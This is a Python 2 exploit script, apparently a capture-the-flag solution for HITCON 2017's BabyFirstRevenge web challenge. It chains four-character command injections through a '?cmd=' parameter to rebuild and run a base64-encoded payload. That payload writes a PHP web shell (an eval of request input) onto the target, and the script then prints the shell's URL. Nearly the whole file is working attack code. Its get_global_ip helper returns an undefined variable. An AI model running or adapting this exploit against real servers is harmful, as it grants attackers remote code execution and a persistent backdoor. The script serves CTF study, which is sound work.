#!/usr/bin/env python
# encoding:utf-8
# Author : WangYihang
# https://gist.github.com/WangYihang/281fda47bbf7c74fd4e0e34bb5c45454
# To solve HITCON-2017-WEB-BabyFirstRevenge

import requests
import hashlib

def get_global_ip():
    # response = requests.get("http://ip.cn/", headers={"User-Agent": "curl/7.55.1"})
    # content = response.content
    # IP = content.split("IP：")[1].split(" ")[0]
    # IP = (==> Get your public ip address from: https://www.whatismyip.com/
    # print(IP)
    return IP

def md5(data):
    return hashlib.md5(data).hexdigest()

def reset(host, port):
    url = "http://%s:%d/?reset=1" % (host, port)
    requests.get(url)

def add_slashes(cmd):
    cmd = cmd.replace(".", "\\.")
    cmd = cmd.replace("\\", "\\\\")
    cmd = cmd.replace("/", "\\/")
    cmd = cmd.replace("|", "\\|")
    cmd = cmd.replace("&", "\\&")
    cmd = cmd.replace("-", "\\-")
    cmd = cmd.replace("<", "\\<")
    cmd = cmd.replace(">", "\\>")
    cmd = cmd.replace("#", "\\#")
    cmd = cmd.replace(" ", "\\ ")
    cmd = cmd.replace("\t", "\\\t")
    cmd = cmd.replace("=", "\\=")
    return cmd

def get(url):
    print "%s" % (url)
    return requests.get(url).content

def exec_cmd(host, port, cmd, max_length):
    url = "http://%s:%d/" % (host, port)
    print "[+] cmd : %s" % (cmd)
    if len(cmd) <= max_length:
        return get("http://%s:%d/?cmd=%s" % (host, port, cmd))
    cmd = add_slashes(cmd)
    print "[+] Full cmd : %s" % (cmd)
    every_length = max_length - len(">") - len("\\")
    times = len(cmd) / every_length
    for i in range(1, times + 1, 1):
        index = i * every_length - 1
        if cmd[index] == "\\":
            cmd = cmd[0:index] + "\\" + cmd[index:]
    cmds = []
    for i in xrange(times):
        every = cmd[every_length * i:every_length * (i+1)]
        true_cmd = ">%s\\" % (every)
        cmds.append(true_cmd.replace("\\\\", "\\"))
    end_cmd = ">%s" % (cmd[times * every_length:])
    if len(end_cmd) == 1:
        cmds[-1] = cmds[-1][0:-2]
    cmds.append(end_cmd)
    for i in cmds[::-1]:
        target = url + "?cmd=" + i.replace("+", "%2b")
        get(target)

def build_ls_t(host, port, shell_script, ls_t_script):
    url = "http://%s:%d/?cmd=>ls\\" % (host, port)
    get(url)
    url = "http://%s:%d/?cmd=>-t\\" % (host, port)
    get(url)
    url = "http://%s:%d/?cmd=>\\%%20\\" % (host, port)
    get(url)
    url = "http://%s:%d/?cmd=>\\>%s" % (host, port, shell_script)
    get(url)
    url = "http://%s:%d/?cmd=ls>>%s" % (host, port, ls_t_script)
    get(url)
    url = "http://%s:%d/?cmd=ls>>%s" % (host, port, ls_t_script)
    get(url)

def shell_exec(host, port, target_command):
    url = "http://%s:%d/" % (host, port)
    reset(host, port)
    shell_script_filename = "a"
    ls_t_script_filename = "b"
    target_shell_script_filename = "c"
    build_ls_t(host, port, shell_script_filename, ls_t_script_filename)
    command = "echo %s|base64\t-d>%s" % (target_command.encode("base64").replace("\n", ""), target_shell_script_filename)
    print "[+] Command : %s" % (command)
    exec_cmd(host, port, command, 4)
    exec_cmd(host, port, "sh %s" % (ls_t_script_filename), 4)
    exec_cmd(host, port, "sh %s" % (shell_script_filename), 4)
    exec_cmd(host, port, "sh %s" % (target_shell_script_filename), 4)

def main():
    host = "xcsecurity.com"
    port = 8055
    webshell_filename = "c.php"
    webshell_password = "c"
    command = "echo '<?php eval($_REQUEST[%s]);?>'>%s" % (webshell_password, webshell_filename)
    shell_exec(host, port, command)
    print "[+] Enjoy your webshell : "
    print "http://%s:%d/sandbox/%s/%s?%s=phpinfo();" % (host, port, md5("Aguns%s" % (get_global_ip())), webshell_filename, webshell_password)

if __name__ == "__main__":
    main()


